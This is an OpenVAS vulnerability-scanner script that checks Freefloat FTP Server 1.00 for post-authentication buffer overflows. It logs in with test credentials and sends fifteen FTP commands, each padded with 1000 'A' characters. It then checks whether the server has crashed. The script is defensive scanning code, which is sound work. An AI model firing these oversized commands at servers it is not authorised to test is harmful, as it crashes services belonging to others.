###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_freefloat_post_auth_mult_cmd_bof_vuln.nasl 9351 2018-04-06 07:05:43Z cfischer $
#
# Freefloat FTP Server POST Auth Multiple Commands Buffer Overflow Vulnerabilities
#
# Authors:
# Veerendra G.G <veerendragg@secpod.com>
#
# Updated By : Veerendra G.G <veerendragg@secpod.com> on 2011-08-09
# Updated Reference section and code to handle other vulnerable commands.
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploits may allow remote attackers to execute arbitrary
code on the system or cause the application to crash.

Impact Level: System/Application";

tag_affected = "FreeFloat Ftp Server Version 1.00, Other versions
may also be affected.";

tag_insight = "The flaw is due to improper bounds checking when processing
'ACCL', 'AUTH', 'APPE', 'ALLO', 'ACCT' multiple commands with specially-crafted
an overly long parameter.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "This host is running Freefloat FTP Server and is prone to
multiple buffer overflow vulnerability.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.900292");
  script_version("$Revision: 9351 $");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2011-07-27 09:16:39 +0200 (Wed, 27 Jul 2011)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Freefloat FTP Server POST Auth Multiple Commands Buffer Overflow Vulnerabilities");
  script_xref(name : "URL" , value : "http://secpod.org/blog/?p=310");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17550");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/103166");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/103162");
  script_xref(name : "URL" , value : "http://secpod.org/SECPOD_FreeFloat_FTP_Server_BoF_PoC.py");
  script_xref(name : "URL" , value : "http://secpod.org/advisories/SECPOD_FreeFloat_FTP_Server_BoF.txt");
  script_xref(name : "URL" , value : "http://www.freefloat.com/sv/freefloat-ftp-server/freefloat-ftp-server.php");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Buffer overflow");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/ftp", 21);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}

##
## The script code starts here
##

include("ftp_func.inc");

ftpPort = get_kb_item("Services/ftp");
if(!ftpPort){
  ftpPort = 21;
}

## check port status
if(!get_port_state(ftpPort)){
  exit(0);
}

## Open TCP Socket
soc = open_sock_tcp(ftpPort);
if(!soc) {
  exit(0);
}

## Accept the banner
banner =  recv(socket:soc, length:512);

## Close the socket
ftp_close(socket:soc);

## Confirm the Application before trying exploit
if("220 FreeFloat" >!< banner){
  exit(0);
}

## Open TCP Socket
soc1 = open_sock_tcp(ftpPort);
if(!soc1) {
  exit(0);
}

##  Exist if not able to login
ftplogin = ftp_log_in(socket:soc1, user:"test", pass:"test");
if(!ftplogin){
  exit(0);
}

vuln_cmds = make_list('ACCL', 'AUTH', 'APPE', 'ALLO', 'ACCT', 'DELE',
                      'MDTM', 'RETR', 'RMD', 'STAT', 'SIZE', 'STOR',
                      'RNTO', 'RNFR', 'STOU');

foreach cmd (vuln_cmds)
{
  ## Send the crafted data
  send(socket:soc1, data:string(cmd, ' ', crap(length: 1000, data:'A'),
                                                              '\r\n'));
  ## Wait for a second
  sleep (1);

  ## Open the socket to confirm FTP server is alive
  soc2 = open_sock_tcp(ftpPort);
  if(!soc2){
    security_message(ftpPort);
    exit(0);
  }

  ## Some time server will be listening, but won't respond
  banner =  recv(socket:soc2, length:512);
  if("220 FreeFloat" >!< banner){
    security_message(ftpPort);
    exit(0);
  }
  ftp_close(socket:soc2);
}

## Close the socket
ftp_close(socket:soc1);
